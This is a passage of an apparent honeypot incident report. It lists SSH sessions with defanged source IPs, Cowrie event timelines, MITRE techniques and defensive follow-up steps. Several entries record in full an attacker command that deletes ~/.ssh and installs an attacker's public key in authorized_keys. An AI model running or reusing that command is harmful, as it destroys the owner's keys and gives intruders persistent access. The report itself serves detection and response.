| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:52:35` | `cowrie.session.connect` |
| `2026-08-24 07:52:35` | `cowrie.client.version` |
| `2026-08-24 07:52:35` | `cowrie.client.kex` |
| `2026-08-24 07:52:36` | `cowrie.login.success` |
| `2026-08-24 07:52:38` | `cowrie.session.params` |
| `2026-08-24 07:52:38` | `cowrie.command.input` |
| `2026-08-24 07:52:38` | `cowrie.command.failed` |
| `2026-08-24 07:52:38` | `cowrie.log.closed` |
| `2026-08-24 07:52:39` | `cowrie.session.params` |
| `2026-08-24 07:52:39` | `cowrie.command.input` |
| `2026-08-24 07:52:39` | `cowrie.session.file_download` |
| `2026-08-24 07:52:39` | `cowrie.log.closed` |
| `2026-08-24 07:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84201ae4b88e

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-08-24 07:52 |
| **Last Seen** | 2026-08-24 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:52:39` | `cowrie.session.connect` |
| `2026-08-24 07:52:39` | `cowrie.client.version` |
| `2026-08-24 07:52:40` | `cowrie.client.kex` |
| `2026-08-24 07:52:41` | `cowrie.login.success` |
| `2026-08-24 07:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d642e362a7

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-08-24 07:52 |
| **Last Seen** | 2026-08-24 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:52:41` | `cowrie.session.connect` |
| `2026-08-24 07:52:41` | `cowrie.client.version` |
| `2026-08-24 07:52:41` | `cowrie.client.kex` |
| `2026-08-24 07:52:42` | `cowrie.login.success` |
| `2026-08-24 07:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8f7bdfbe849

| Field | Detail |
|---|---|
| **Source IP** | `106.70.0[.]181` |
| **First Seen** | 2026-08-24 07:57 |
| **Last Seen** | 2026-08-24 07:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:57:10` | `cowrie.session.connect` |
| `2026-08-24 07:57:10` | `cowrie.client.version` |
| `2026-08-24 07:57:11` | `cowrie.client.kex` |
| `2026-08-24 07:57:13` | `cowrie.login.success` |
| `2026-08-24 07:57:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.70.0[.]181` to AbuseIPDB if not already reported
- [ ] Block `106.70.0[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cec1da3a2bc

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-24 07:57 |
| **Last Seen** | 2026-08-24 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:57:20` | `cowrie.session.connect` |
| `2026-08-24 07:57:20` | `cowrie.client.version` |
| `2026-08-24 07:57:20` | `cowrie.client.kex` |
| `2026-08-24 07:57:23` | `cowrie.login.success` |
| `2026-08-24 07:57:23` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1adf29d99cfa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:58 |
| **Last Seen** | 2026-08-24 07:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:58:56` | `cowrie.session.connect` |
| `2026-08-24 07:58:56` | `cowrie.client.version` |
| `2026-08-24 07:58:56` | `cowrie.client.kex` |
| `2026-08-24 07:58:57` | `cowrie.login.success` |
| `2026-08-24 07:58:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:58:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:58:58` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e1e31ac2a80

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:59 |
| **Last Seen** | 2026-08-24 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:59:02` | `cowrie.session.connect` |
| `2026-08-24 07:59:02` | `cowrie.client.version` |
| `2026-08-24 07:59:02` | `cowrie.client.kex` |
| `2026-08-24 07:59:03` | `cowrie.login.success` |
| `2026-08-24 07:59:03` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:59:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:59:03` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f9662727cc

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-08-24 08:00 |
| **Last Seen** | 2026-08-24 08:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:00:04` | `cowrie.session.connect` |
| `2026-08-24 08:00:05` | `cowrie.client.version` |
| `2026-08-24 08:00:05` | `cowrie.client.kex` |
| `2026-08-24 08:00:07` | `cowrie.login.success` |
| `2026-08-24 08:00:08` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e2e087c753

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-08-24 08:00 |
| **Last Seen** | 2026-08-24 08:05 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:00:13` | `cowrie.session.connect` |
| `2026-08-24 08:00:13` | `cowrie.client.version` |
| `2026-08-24 08:00:13` | `cowrie.client.kex` |
| `2026-08-24 08:00:15` | `cowrie.login.success` |
| `2026-08-24 08:00:15` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57408d2f8983

| Field | Detail |
|---|---|
| **Source IP** | `91.219.196[.]17` |
| **First Seen** | 2026-08-24 08:05 |
| **Last Seen** | 2026-08-24 08:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:05:12` | `cowrie.session.connect` |
| `2026-08-24 08:05:12` | `cowrie.client.version` |
| `2026-08-24 08:05:12` | `cowrie.client.kex` |
| `2026-08-24 08:05:13` | `cowrie.login.success` |
| `2026-08-24 08:05:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.219.196[.]17` to AbuseIPDB if not already reported
- [ ] Block `91.219.196[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c740c04da93f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:09 |
| **Last Seen** | 2026-08-24 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:09:43` | `cowrie.session.connect` |
| `2026-08-24 08:09:43` | `cowrie.client.version` |
| `2026-08-24 08:09:44` | `cowrie.client.kex` |
| `2026-08-24 08:09:45` | `cowrie.login.success` |
| `2026-08-24 08:09:45` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:09:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:09:45` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b642dc88f453

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:09 |
| **Last Seen** | 2026-08-24 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:09:50` | `cowrie.session.connect` |
| `2026-08-24 08:09:50` | `cowrie.client.version` |
| `2026-08-24 08:09:51` | `cowrie.client.kex` |
| `2026-08-24 08:09:51` | `cowrie.login.success` |
| `2026-08-24 08:09:52` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:09:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:09:52` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74f6a2a7da3

| Field | Detail |
|---|---|
| **Source IP** | `117.204.1[.]45` |
| **First Seen** | 2026-08-24 08:10 |
| **Last Seen** | 2026-08-24 08:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:10:15` | `cowrie.session.connect` |
| `2026-08-24 08:10:16` | `cowrie.client.version` |
| `2026-08-24 08:10:16` | `cowrie.client.kex` |
| `2026-08-24 08:10:18` | `cowrie.login.success` |
| `2026-08-24 08:10:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.204.1[.]45` to AbuseIPDB if not already reported
- [ ] Block `117.204.1[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a74771f4d4

| Field | Detail |
|---|---|
| **Source IP** | `176.103.15[.]75` |
| **First Seen** | 2026-08-24 08:10 |
| **Last Seen** | 2026-08-24 08:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:10:17` | `cowrie.session.connect` |
| `2026-08-24 08:10:17` | `cowrie.client.version` |
| `2026-08-24 08:10:17` | `cowrie.client.kex` |
| `2026-08-24 08:10:18` | `cowrie.login.success` |
| `2026-08-24 08:10:19` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.103.15[.]75` to AbuseIPDB if not already reported
- [ ] Block `176.103.15[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2988e8dd98e1

| Field | Detail |
|---|---|
| **Source IP** | `131.161.249[.]165` |
| **First Seen** | 2026-08-24 08:16 |
| **Last Seen** | 2026-08-24 08:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:16:25` | `cowrie.session.connect` |
| `2026-08-24 08:16:25` | `cowrie.client.version` |
| `2026-08-24 08:16:25` | `cowrie.client.kex` |
| `2026-08-24 08:16:25` | `cowrie.login.success` |
| `2026-08-24 08:16:26` | `cowrie.session.params` |
| `2026-08-24 08:16:26` | `cowrie.command.input` |
| `2026-08-24 08:16:26` | `cowrie.command.failed` |
| `2026-08-24 08:16:26` | `cowrie.log.closed` |
| `2026-08-24 08:16:27` | `cowrie.session.params` |
| `2026-08-24 08:16:27` | `cowrie.command.input` |
| `2026-08-24 08:16:27` | `cowrie.session.file_download` |
| `2026-08-24 08:16:27` | `cowrie.log.closed` |
| `2026-08-24 08:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `131.161.249[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d43af5d83f

| Field | Detail |
|---|---|
| **Source IP** | `131.161.249[.]165` |
| **First Seen** | 2026-08-24 08:16 |
| **Last Seen** | 2026-08-24 08:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:16:27` | `cowrie.session.connect` |
| `2026-08-24 08:16:27` | `cowrie.client.version` |
| `2026-08-24 08:16:27` | `cowrie.client.kex` |
| `2026-08-24 08:16:28` | `cowrie.login.success` |
| `2026-08-24 08:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `131.161.249[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f9d8f06c0e4

| Field | Detail |
|---|---|
| **Source IP** | `131.161.249[.]165` |
| **First Seen** | 2026-08-24 08:16 |
| **Last Seen** | 2026-08-24 08:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:16:28` | `cowrie.session.connect` |
| `2026-08-24 08:16:28` | `cowrie.client.version` |
| `2026-08-24 08:16:28` | `cowrie.client.kex` |
| `2026-08-24 08:16:29` | `cowrie.login.success` |
| `2026-08-24 08:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `131.161.249[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0056b613982d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:19 |
| **Last Seen** | 2026-08-24 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:19:36` | `cowrie.session.connect` |
| `2026-08-24 08:19:36` | `cowrie.client.version` |
| `2026-08-24 08:19:36` | `cowrie.client.kex` |
| `2026-08-24 08:19:37` | `cowrie.login.success` |
| `2026-08-24 08:19:37` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:19:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:19:37` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca96a705401

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 08:19 |
| **Last Seen** | 2026-08-24 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:19:39` | `cowrie.session.connect` |
| `2026-08-24 08:19:39` | `cowrie.client.version` |
| `2026-08-24 08:19:39` | `cowrie.client.kex` |
| `2026-08-24 08:19:40` | `cowrie.login.success` |
| `2026-08-24 08:19:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 08:19:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 08:19:41` | `cowrie.direct-tcpip.data` |
| `2026-08-24 08:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-451e9f934801

| Field | Detail |
|---|---|
| **Source IP** | `64.62.156[.]202` |
| **First Seen** | 2026-08-24 08:20 |
| **Last Seen** | 2026-08-24 08:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:20:22` | `cowrie.session.connect` |
| `2026-08-24 08:20:22` | `cowrie.login.success` |
| `2026-08-24 08:20:22` | `cowrie.session.params` |
| `2026-08-24 08:20:22` | `cowrie.command.input` |
| `2026-08-24 08:20:22` | `cowrie.command.input` |
| `2026-08-24 08:20:22` | `cowrie.command.failed` |
| `2026-08-24 08:20:22` | `cowrie.command.input` |
| `2026-08-24 08:20:22` | `cowrie.command.failed` |
| `2026-08-24 08:20:22` | `cowrie.command.input` |
| `2026-08-24 08:20:22` | `cowrie.log.closed` |
| `2026-08-24 08:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.62.156[.]202` to AbuseIPDB if not already reported
- [ ] Block `64.62.156[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c497b27aa568

| Field | Detail |
|---|---|
| **Source IP** | `182.171.90[.]17` |
| **First Seen** | 2026-08-24 08:28 |
| **Last Seen** | 2026-08-24 08:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:28:40` | `cowrie.session.connect` |
| `2026-08-24 08:28:40` | `cowrie.client.version` |
| `2026-08-24 08:28:40` | `cowrie.client.kex` |
| `2026-08-24 08:28:40` | `cowrie.login.success` |
| `2026-08-24 08:28:41` | `cowrie.session.params` |
| `2026-08-24 08:28:41` | `cowrie.command.input` |
| `2026-08-24 08:28:41` | `cowrie.command.failed` |
| `2026-08-24 08:28:42` | `cowrie.log.closed` |
| `2026-08-24 08:28:43` | `cowrie.session.params` |
| `2026-08-24 08:28:43` | `cowrie.command.input` |
| `2026-08-24 08:28:43` | `cowrie.session.file_download` |
| `2026-08-24 08:28:43` | `cowrie.log.closed` |
| `2026-08-24 08:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.171.90[.]17` to AbuseIPDB if not already reported
- [ ] Block `182.171.90[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94310f431a0

| Field | Detail |
|---|---|
| **Source IP** | `182.171.90[.]17` |
| **First Seen** | 2026-08-24 08:28 |
| **Last Seen** | 2026-08-24 08:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 08:28:43` | `cowrie.session.connect` |
| `2026-08-24 08:28:43` | `cowrie.client.version` |
| `2026-08-24 08:28:43` | `cowrie.client.kex` |
| `2026-08-24 08:28:44` | `cowrie.login.success` |
| `2026-08-24 08:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.171.90[.]17` to AbuseIPDB if not already reported
- [ ] Block `182.171.90[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a97303f2943

| Field | Detail |
|---|---|
| **Source IP** | `182.171.90[.]17` |
| **First Seen** | 2026-08-24 08:28 |
| **Last Seen** | 2026-08-24 08:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

